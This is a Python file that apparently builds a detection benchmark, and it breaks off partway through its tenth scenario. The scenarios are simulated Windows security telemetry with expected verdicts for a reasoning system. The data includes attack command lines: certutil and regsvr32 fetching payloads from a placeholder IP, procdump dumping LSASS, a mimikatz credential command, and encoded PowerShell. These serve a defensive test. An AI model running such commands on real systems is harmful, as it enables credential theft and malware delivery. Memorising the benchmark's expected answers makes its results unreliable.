"""Benchmark scenario corpus for systematic reasoning quality measurement.

Each scenario constructs an EvidencePacket by hand (same pattern as
sample_packets.py), freezes it, and wraps it with metadata describing
the expected behavior.  All 12 scenarios use scenario-specific fact_id
prefixes (``sc001-``, ``sc002-``, ...) to guarantee zero cross-scenario
collisions.

Public API:
    get_all_scenarios()      -> tuple of all 12 BenchmarkScenarios
    get_scenarios_by_tier()  -> scenarios for a specific difficulty tier
    get_scenario_by_id()     -> single scenario by ID (e.g., "SC-001")
"""

from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime
from typing import Dict

from ares.dialectic.evidence.fact import EntityType, Fact
from ares.dialectic.evidence.packet import EvidencePacket, TimeWindow
from ares.dialectic.evidence.provenance import Provenance, SourceType


# =============================================================================
# Metadata types
# =============================================================================

@dataclass(frozen=True)
class ScenarioMetadata:
    """Metadata describing a benchmark scenario.

    Attributes:
        scenario_id: Identifier in "SC-NNN" format.
        name: Human-readable scenario name.
        description: What this scenario represents.
        mitre_attack_ids: MITRE ATT&CK technique IDs (Txxxx format).
        mitre_tactic: Primary MITRE ATT&CK tactic.
        difficulty_tier: 1-4 (1=baseline, 2=reasoning, 3=stress skeptic, 4=limits).
        expected_verdict: "THREAT_CONFIRMED", "THREAT_DISMISSED", or "INCONCLUSIVE".
        expected_winner: "ARCHITECT", "SKEPTIC", or "BALANCED".
        fact_count: Must match actual packet fact count.
        notes: Design rationale for this scenario.
    """

    scenario_id: str
    name: str
    description: str
    mitre_attack_ids: tuple[str, ...]
    mitre_tactic: str
    difficulty_tier: int
    expected_verdict: str
    expected_winner: str
    fact_count: int
    notes: str


@dataclass(frozen=True)
class BenchmarkScenario:
    """A complete benchmark scenario: metadata + frozen evidence packet.

    Attributes:
        metadata: Scenario metadata (expected verdicts, MITRE mapping, etc.).
        packet: Frozen EvidencePacket with all scenario facts.
    """

    metadata: ScenarioMetadata
    packet: EvidencePacket


# =============================================================================
# Helpers
# =============================================================================

def _make_fact(
    prefix: str,
    num: int,
    entity_id: str,
    entity_type: EntityType,
    field: str,
    value: object,
    timestamp: datetime,
    source_type: SourceType,
    source_ref: str,
) -> Fact:
    """Create a Fact with consistent naming conventions."""
    return Fact(
        fact_id=f"{prefix}-fact-{num:03d}",
        entity_id=entity_id,
        entity_type=entity_type,
        field=field,
        value=value,
        timestamp=timestamp,
        provenance=Provenance(
            source_type=source_type,
            source_id=source_ref,
            parser_version="1.0.0",
        ),
    )


# =============================================================================
# Tier 1 — Baseline (rule-based handles well)
# =============================================================================

def build_sc001_privilege_escalation() -> BenchmarkScenario:
    """SC-001: Classic privilege escalation.

    User logon → special privileges assigned → whoami /priv execution.
    Rule-based Architect should detect PRIVILEGE_ESCALATION + SUSPICIOUS_PROCESS.
    """
    ts_base = datetime(2026, 2, 14, 2, 15, 0)
    prefix = "sc001"
    src = "dc01:Security:2026-02-14T02:15:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-priv-esc",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 2, 0, 0),
            end=datetime(2026, 2, 14, 3, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "user-jdoe", EntityType.NODE, "logon_type",
                   "RemoteInteractive (Type 10)", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 2, "user-jdoe", EntityType.NODE, "logon_account",
                   "CORP\\jdoe", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 3, "user-jdoe", EntityType.NODE, "privilege_assigned",
                   "SeDebugPrivilege", datetime(2026, 2, 14, 2, 15, 1),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 4, "user-jdoe", EntityType.NODE, "privilege_assigned",
                   "SeTcbPrivilege", datetime(2026, 2, 14, 2, 15, 1),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 5, "proc-whoami", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\cmd.exe", datetime(2026, 2, 14, 2, 16, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "proc-whoami", EntityType.NODE, "command_line",
                   "cmd.exe /c whoami /priv", datetime(2026, 2, 14, 2, 16, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 7, "user-jdoe", EntityType.NODE, "source_workstation",
                   "UNKNOWN-PC", ts_base,
                   SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-001",
        name="Privilege Escalation (Classic)",
        description="User logon from unknown workstation with admin privileges and whoami execution",
        mitre_attack_ids=("T1548",),
        mitre_tactic="Privilege Escalation",
        difficulty_tier=1,
        expected_verdict="INCONCLUSIVE",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 1 baseline — rule-based should detect priv-esc + suspicious process easily",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc002_suspicious_process_chain() -> BenchmarkScenario:
    """SC-002: Suspicious process chain — excel.exe → cmd.exe → powershell.exe.

    Classic macro-based attack chain where Excel spawns cmd which spawns
    PowerShell with an encoded command.
    """
    ts_base = datetime(2026, 2, 14, 10, 30, 0)
    prefix = "sc002"
    src = "ws-finance-03:Security:2026-02-14T10:30:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-proc-chain",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 10, 0, 0),
            end=datetime(2026, 2, 14, 11, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "proc-excel", EntityType.NODE, "process_name",
                   "C:\\Program Files\\Microsoft Office\\EXCEL.EXE",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-excel", EntityType.NODE, "executable_user",
                   "CORP\\analyst01", ts_base,
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "proc-cmd", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\cmd.exe",
                   datetime(2026, 2, 14, 10, 30, 5),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "proc-cmd", EntityType.NODE, "parent_process",
                   "EXCEL.EXE", datetime(2026, 2, 14, 10, 30, 5),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "proc-ps", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\powershell.exe",
                   datetime(2026, 2, 14, 10, 30, 8),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "proc-ps", EntityType.NODE, "command_line",
                   "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                   datetime(2026, 2, 14, 10, 30, 8),
                   SourceType.PROCESS_LIST, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-002",
        name="Suspicious Process Chain",
        description="Excel spawns cmd.exe which spawns PowerShell with encoded command",
        mitre_attack_ids=("T1059",),
        mitre_tactic="Execution",
        difficulty_tier=1,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 1 baseline — cmd.exe and powershell.exe in chain are textbook IOCs",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc003_credential_dumping() -> BenchmarkScenario:
    """SC-003: Credential dumping — LSASS process access and memory read.

    Mimikatz-style credential extraction from LSASS process memory.
    """
    ts_base = datetime(2026, 2, 14, 3, 45, 0)
    prefix = "sc003"
    src = "dc02:Security:2026-02-14T03:45:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-cred-dump",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 3, 0, 0),
            end=datetime(2026, 2, 14, 4, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "proc-lsass", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\lsass.exe", ts_base,
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-lsass", EntityType.NODE, "lsass_access_granted",
                   "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION",
                   datetime(2026, 2, 14, 3, 45, 2),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "proc-unknown", EntityType.NODE, "process_name",
                   "C:\\Users\\Public\\procdump.exe",
                   datetime(2026, 2, 14, 3, 45, 1),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "proc-unknown", EntityType.NODE, "command_line",
                   "procdump.exe -ma lsass.exe lsass.dmp",
                   datetime(2026, 2, 14, 3, 45, 1),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "proc-unknown", EntityType.NODE, "credential_tool_signature",
                   "sekurlsa::logonpasswords pattern detected",
                   datetime(2026, 2, 14, 3, 45, 3),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "file-dump", EntityType.NODE, "file_created",
                   "C:\\Users\\Public\\lsass.dmp",
                   datetime(2026, 2, 14, 3, 45, 4),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 7, "user-attacker", EntityType.NODE, "logon_account",
                   "CORP\\svc_backup", ts_base,
                   SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-003",
        name="Credential Dumping",
        description="LSASS process access with credential dumping tool signature",
        mitre_attack_ids=("T1003",),
        mitre_tactic="Credential Access",
        difficulty_tier=1,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 1 baseline — LSASS + sekurlsa + procdump are strong credential IOCs",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# Tier 2 — Requires LLM reasoning
# =============================================================================

def build_sc004_lolbins() -> BenchmarkScenario:
    """SC-004: Living-Off-the-Land binaries.

    certutil.exe downloads from external URL, mshta.exe runs HTA file,
    regsvr32.exe loads remote script.  All legitimate Windows binaries
    used maliciously — no single fact is alarming alone.
    """
    ts_base = datetime(2026, 2, 14, 14, 0, 0)
    prefix = "sc004"
    src = "ws-eng-07:Security:2026-02-14T14:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-lolbins",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 13, 30, 0),
            end=datetime(2026, 2, 14, 15, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "proc-certutil", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\certutil.exe", ts_base,
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-certutil", EntityType.NODE, "command_line",
                   "certutil.exe -urlcache -split -f http://203.0.113.50/payload.bin C:\\Temp\\payload.bin",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "proc-mshta", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\mshta.exe",
                   datetime(2026, 2, 14, 14, 2, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "proc-mshta", EntityType.NODE, "command_line",
                   "mshta.exe C:\\Temp\\update.hta",
                   datetime(2026, 2, 14, 14, 2, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "proc-regsvr32", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\regsvr32.exe",
                   datetime(2026, 2, 14, 14, 5, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "proc-regsvr32", EntityType.NODE, "command_line",
                   "regsvr32.exe /s /n /u /i:http://203.0.113.50/script.sct scrobj.dll",
                   datetime(2026, 2, 14, 14, 5, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 7, "net-conn-1", EntityType.EDGE, "network_connection",
                   "203.0.113.50:443", ts_base,
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 8, "net-conn-1", EntityType.EDGE, "remote_ip_reputation",
                   "uncategorized — first seen 48h ago",
                   ts_base, SourceType.NETFLOW, src),
        _make_fact(prefix, 9, "user-eng07", EntityType.NODE, "logon_account",
                   "CORP\\engineer07", ts_base,
                   SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-004",
        name="Living-Off-the-Land (LOLBins)",
        description="Legitimate Windows binaries used to download, execute, and register remote content",
        mitre_attack_ids=("T1218",),
        mitre_tactic="Defense Evasion",
        difficulty_tier=2,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 2 — no single fact is alarming; threat is in the combination of LOLBins",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc005_lateral_movement_rdp() -> BenchmarkScenario:
    """SC-005: Lateral movement via RDP + pass-the-hash indicators.

    NTLM auth events, RDP sessions from one workstation to multiple
    servers, and hash-based auth indicators.  RDP is normal admin
    behavior so the Skeptic should have strong arguments.
    """
    ts_base = datetime(2026, 2, 14, 11, 0, 0)
    prefix = "sc005"
    src = "dc01:Security:2026-02-14T11:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-lateral-rdp",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 10, 30, 0),
            end=datetime(2026, 2, 14, 12, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "auth-ntlm-1", EntityType.NODE, "logon_type",
                   "Network (Type 3) — NTLM", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 2, "auth-ntlm-1", EntityType.NODE, "logon_account",
                   "CORP\\svc_admin", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 3, "rdp-session-1", EntityType.EDGE, "remote_desktop_session",
                   "svc_admin -> SERVER-DB01 (10.0.1.20)",
                   datetime(2026, 2, 14, 11, 2, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 4, "rdp-session-2", EntityType.EDGE, "remote_desktop_session",
                   "svc_admin -> SERVER-APP01 (10.0.1.30)",
                   datetime(2026, 2, 14, 11, 5, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 5, "rdp-session-3", EntityType.EDGE, "remote_desktop_session",
                   "svc_admin -> SERVER-FILE01 (10.0.1.40)",
                   datetime(2026, 2, 14, 11, 8, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 6, "auth-hash-1", EntityType.NODE, "ntlm_hash_auth",
                   "Pass-the-Hash indicator: same NTLM hash across 3 logon events",
                   datetime(2026, 2, 14, 11, 10, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 7, "user-svcadmin", EntityType.NODE, "account_type",
                   "service_account — IT Operations", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 8, "user-svcadmin", EntityType.NODE, "logon_source_ip",
                   "10.0.2.50 (WORKSTATION-IT01)", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 9, "ticket-ref", EntityType.NODE, "change_request",
                   "CHG-2026-0214: Quarterly server patching window",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 10, "net-traffic-1", EntityType.EDGE, "smb_lateral_traffic",
                   "SMB traffic between 10.0.2.50 and 10.0.1.20, 10.0.1.30, 10.0.1.40",
                   datetime(2026, 2, 14, 11, 12, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 11, "priv-assign", EntityType.NODE, "privilege_assigned",
                   "SeBackupPrivilege on SERVER-FILE01",
                   datetime(2026, 2, 14, 11, 9, 0),
                   SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-005",
        name="Lateral Movement via RDP + Pass-the-Hash",
        description="NTLM auth with RDP sessions to multiple servers and hash reuse indicators",
        mitre_attack_ids=("T1021", "T1550"),
        mitre_tactic="Lateral Movement",
        difficulty_tier=2,
        expected_verdict="INCONCLUSIVE",
        expected_winner="BALANCED",
        fact_count=len(facts),
        notes="Tier 2 — RDP is normal admin behavior; change request provides skeptic ammo",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc006_data_staging() -> BenchmarkScenario:
    """SC-006: Data staging before exfiltration.

    File copy operations to C:\\Temp, archive creation with 7z.exe,
    but no outbound network transfer detected yet.
    """
    ts_base = datetime(2026, 2, 14, 16, 0, 0)
    prefix = "sc006"
    src = "ws-hr-02:Security:2026-02-14T16:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-data-stage",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 15, 30, 0),
            end=datetime(2026, 2, 14, 17, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "file-copy-1", EntityType.NODE, "file_copy_operation",
                   "C:\\HR\\Personnel\\*.xlsx -> C:\\Temp\\staging\\",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "file-copy-2", EntityType.NODE, "file_copy_operation",
                   "C:\\HR\\Payroll\\*.csv -> C:\\Temp\\staging\\",
                   datetime(2026, 2, 14, 16, 1, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "proc-7z", EntityType.NODE, "process_name",
                   "C:\\Program Files\\7-Zip\\7z.exe",
                   datetime(2026, 2, 14, 16, 5, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "proc-7z", EntityType.NODE, "command_line",
                   "7z.exe a -p C:\\Temp\\archive_20260214.7z C:\\Temp\\staging\\*",
                   datetime(2026, 2, 14, 16, 5, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "file-archive", EntityType.NODE, "file_created",
                   "C:\\Temp\\archive_20260214.7z (size: 42MB)",
                   datetime(2026, 2, 14, 16, 6, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "user-hr02", EntityType.NODE, "logon_account",
                   "CORP\\hr_analyst02",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 7, "user-hr02", EntityType.NODE, "authorized_hr_access",
                   "hr_analyst02 has read access to HR folders per AD group membership",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 8, "net-status", EntityType.EDGE, "network_outbound_check",
                   "No outbound transfers detected from ws-hr-02 in time window",
                   datetime(2026, 2, 14, 16, 30, 0),
                   SourceType.NETFLOW, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-006",
        name="Data Staging Before Exfiltration",
        description="File copies to temp directory and password-protected archive creation, no exfil yet",
        mitre_attack_ids=("T1074",),
        mitre_tactic="Collection",
        difficulty_tier=2,
        expected_verdict="INCONCLUSIVE",
        expected_winner="BALANCED",
        fact_count=len(facts),
        notes="Tier 2 — staging is suspicious but user has legit access and no exfil detected",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc007_insider_threat() -> BenchmarkScenario:
    """SC-007: Insider threat — behavioral anomaly.

    Authorized user at 2:30 AM accessing sensitive directories with
    bulk file reads.  No privilege escalation, no malware.  Every
    individual fact is legitimate.
    """
    ts_base = datetime(2026, 2, 14, 2, 30, 0)
    prefix = "sc007"
    src = "ws-finance-01:Security:2026-02-14T02:30:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-insider",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 2, 0, 0),
            end=datetime(2026, 2, 14, 4, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "user-finance01", EntityType.NODE, "logon_account",
                   "CORP\\finance_mgr01", ts_base,
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 2, "user-finance01", EntityType.NODE, "logon_time",
                   "2026-02-14T02:30:00Z — outside normal working hours (09:00-18:00)",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 3, "access-1", EntityType.NODE, "directory_traversal",
                   "C:\\Finance\\Quarterly_Reports\\ — 47 files accessed",
                   datetime(2026, 2, 14, 2, 35, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "access-2", EntityType.NODE, "directory_traversal",
                   "C:\\Finance\\Compensation\\ — 23 files accessed",
                   datetime(2026, 2, 14, 2, 42, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "access-3", EntityType.NODE, "bulk_file_read",
                   "70 files read in 15-minute window (normal baseline: 5-10 files/hour)",
                   datetime(2026, 2, 14, 2, 50, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "authz-check", EntityType.NODE, "authorization_status",
                   "finance_mgr01 authorized for Finance directory access per AD group",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 7, "threat-indicators", EntityType.NODE, "malware_scan_result",
                   "No malware indicators detected on ws-finance-01",
                   datetime(2026, 2, 14, 3, 0, 0),
                   SourceType.PROCESS_LIST, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-007",
        name="Insider Threat — Behavioral Anomaly",
        description="Authorized user accessing sensitive directories at unusual hours with bulk reads",
        mitre_attack_ids=("T1530",),
        mitre_tactic="Collection",
        difficulty_tier=2,
        expected_verdict="INCONCLUSIVE",
        expected_winner="BALANCED",
        fact_count=len(facts),
        notes="Tier 2 — every individual fact is legitimate; threat is purely contextual",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# Tier 3 — Stress the Skeptic
# =============================================================================

def build_sc008_benign_av_update() -> BenchmarkScenario:
    """SC-008: Benign activity mimicking malware.

    Windows Defender update touching LSASS, signed PowerShell script
    from defender path, scheduled task modification — all false positive
    indicators.
    """
    ts_base = datetime(2026, 2, 14, 4, 0, 0)
    prefix = "sc008"
    src = "ws-sales-05:Security:2026-02-14T04:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-benign-av",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 3, 30, 0),
            end=datetime(2026, 2, 14, 5, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "proc-defender", EntityType.NODE, "process_name",
                   "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-defender", EntityType.NODE, "lsass_access_granted",
                   "PROCESS_QUERY_LIMITED_INFORMATION — Windows Defender scan",
                   datetime(2026, 2, 14, 4, 0, 5),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "proc-ps-update", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\powershell.exe",
                   datetime(2026, 2, 14, 4, 1, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "proc-ps-update", EntityType.NODE, "command_line",
                   "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\Microsoft\\Windows Defender\\Update-Signatures.ps1",
                   datetime(2026, 2, 14, 4, 1, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "schtask-mod", EntityType.NODE, "scheduled_task_modified",
                   "Windows Defender Scheduled Scan — next run updated to 2026-02-15T04:00:00Z",
                   datetime(2026, 2, 14, 4, 2, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "file-sig", EntityType.NODE, "file_signature_status",
                   "Update-Signatures.ps1: Authenticode signed by Microsoft Corporation",
                   datetime(2026, 2, 14, 4, 1, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 7, "temp-file", EntityType.NODE, "file_created",
                   "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\mpavdlta.vdm",
                   datetime(2026, 2, 14, 4, 3, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 8, "defender-service", EntityType.NODE, "service_status",
                   "WinDefend service running — PID 4892 — SYSTEM account",
                   ts_base, SourceType.PROCESS_LIST, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-008",
        name="Benign Activity Mimicking Malware",
        description="Windows Defender update with LSASS access, PowerShell execution, and task modification",
        mitre_attack_ids=(),
        mitre_tactic="None (false positive)",
        difficulty_tier=3,
        expected_verdict="THREAT_DISMISSED",
        expected_winner="SKEPTIC",
        fact_count=len(facts),
        notes="Tier 3 — stress the Skeptic; all indicators are AV update, not malware",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc009_authorized_red_team() -> BenchmarkScenario:
    """SC-009: Authorized red team exercise.

    Nmap scanning, metasploit-like behavior, credential dumping — but
    with explicit authorization facts and pentest user account.
    """
    ts_base = datetime(2026, 2, 14, 9, 0, 0)
    prefix = "sc009"
    src = "pentest-ws-01:Security:2026-02-14T09:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-red-team",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 8, 0, 0),
            end=datetime(2026, 2, 14, 18, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "proc-nmap", EntityType.NODE, "process_name",
                   "C:\\Tools\\nmap\\nmap.exe",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-nmap", EntityType.NODE, "command_line",
                   "nmap.exe -sS -sV -p- 10.0.0.0/24",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "net-scan-1", EntityType.EDGE, "network_scan_detected",
                   "SYN scan: 65535 ports across 254 hosts from 10.0.5.100",
                   datetime(2026, 2, 14, 9, 5, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 4, "proc-msf", EntityType.NODE, "process_name",
                   "C:\\Tools\\metasploit\\msfconsole.exe",
                   datetime(2026, 2, 14, 10, 0, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 5, "proc-msf", EntityType.NODE, "command_line",
                   "msfconsole.exe -r pentest_2026Q1.rc",
                   datetime(2026, 2, 14, 10, 0, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "cred-attempt", EntityType.NODE, "credential_access_attempt",
                   "mimikatz sekurlsa::logonpasswords executed on target DC02",
                   datetime(2026, 2, 14, 11, 0, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 7, "rdp-lateral", EntityType.EDGE, "remote_desktop_session",
                   "pentest_user -> SERVER-DB01, SERVER-APP01",
                   datetime(2026, 2, 14, 12, 0, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 8, "user-pentest", EntityType.NODE, "logon_account",
                   "CORP\\pentest_user — authorized penetration tester",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 9, "authz-pentest", EntityType.NODE, "authorization_status",
                   "Authorized: Pentest engagement PT-2026-Q1, scope 10.0.0.0/16",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 10, "change-window", EntityType.NODE, "change_window_active",
                   "Active change window: CHG-2026-PT01, 2026-02-14 08:00 to 18:00",
                   ts_base, SourceType.AUTH_LOG, src),
        _make_fact(prefix, 11, "security_team_ack", EntityType.NODE, "security_notification",
                   "SOC notified: red team exercise in progress per RT-2026-001",
                   ts_base, SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-009",
        name="Authorized Red Team Exercise",
        description="Nmap scanning, metasploit, credential dumping — with explicit authorization",
        mitre_attack_ids=("T1046", "T1003", "T1021"),
        mitre_tactic="Multiple (authorized pentest)",
        difficulty_tier=3,
        expected_verdict="THREAT_DISMISSED",
        expected_winner="SKEPTIC",
        fact_count=len(facts),
        notes="Tier 3 — Skeptic must recognize pentest authorization facts override threat indicators",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# Tier 4 — Find the Limits
# =============================================================================

def build_sc010_multi_vector_campaign() -> BenchmarkScenario:
    """SC-010: Multi-vector campaign — full kill chain.

    Macro execution → cmd.exe → credential dumping → lateral movement
    to 3 hosts → data compression → outbound HTTPS to suspicious IP.
    """
    ts_base = datetime(2026, 2, 14, 8, 0, 0)
    prefix = "sc010"
    src = "ws-exec-01:Security:2026-02-14T08:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-multi-vector",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 7, 30, 0),
            end=datetime(2026, 2, 14, 12, 0, 0),
        ),
    )

    facts = [
        # Phase 1: Initial access via macro
        _make_fact(prefix, 1, "proc-word", EntityType.NODE, "process_name",
                   "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-word", EntityType.NODE, "file_opened",
                   "Q1_Report_URGENT.docm (macro-enabled document)",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "proc-cmd-1", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\cmd.exe",
                   datetime(2026, 2, 14, 8, 0, 10),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 4, "proc-cmd-1", EntityType.NODE, "parent_process",
                   "WINWORD.EXE", datetime(2026, 2, 14, 8, 0, 10),
                   SourceType.PROCESS_LIST, src),
        # Phase 2: Credential dumping
        _make_fact(prefix, 5, "proc-dump", EntityType.NODE, "process_name",
                   "C:\\Users\\Public\\procdump64.exe",
                   datetime(2026, 2, 14, 8, 5, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "proc-dump", EntityType.NODE, "command_line",
                   "procdump64.exe -ma lsass.exe C:\\Users\\Public\\debug.dmp",
                   datetime(2026, 2, 14, 8, 5, 0),
                   SourceType.PROCESS_LIST, src),
